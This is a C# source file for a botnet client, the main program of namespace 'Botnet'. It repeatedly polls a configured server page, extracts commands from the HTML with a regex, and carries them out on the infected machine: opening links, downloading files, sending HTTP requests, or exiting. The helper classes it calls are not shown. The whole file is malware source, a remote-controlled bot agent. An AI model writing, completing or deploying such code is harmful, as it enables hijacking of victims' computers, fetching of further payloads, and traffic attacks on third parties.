using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Botnet
{
    class Program
    {

        static string last_cmd = string.Empty;
        static void Main(string[] args)
        {
            while (true)
            {
                string html = web.GetHTML(configs.server);
                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                
                string content = regx.Groups[1].Value;
                if (last_cmd == content)
                {
                    Thread.Sleep(configs.delay);
                    continue;
                }
                last_cmd = content;
               
                cmd command = new cmd(content);
                Execute(command);
                Thread.Sleep(configs.delay);


            }

        }

        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":
                    Functions.OpenLink(CMD.ComContent);
                    Console.WriteLine(CMD.ComContent);
                    break;
                case "downlaod":
                    Functions.Download(CMD.ComContent);
                    break;
                case "cl":
                    Thread.Sleep(configs.delay);
                    break;
                case "http":
                    Functions.Httprequest(CMD.ComContent);
                    break;
               
                case "exit":
                    Environment.Exit(0);
                    break;
            }

        }
    }
}
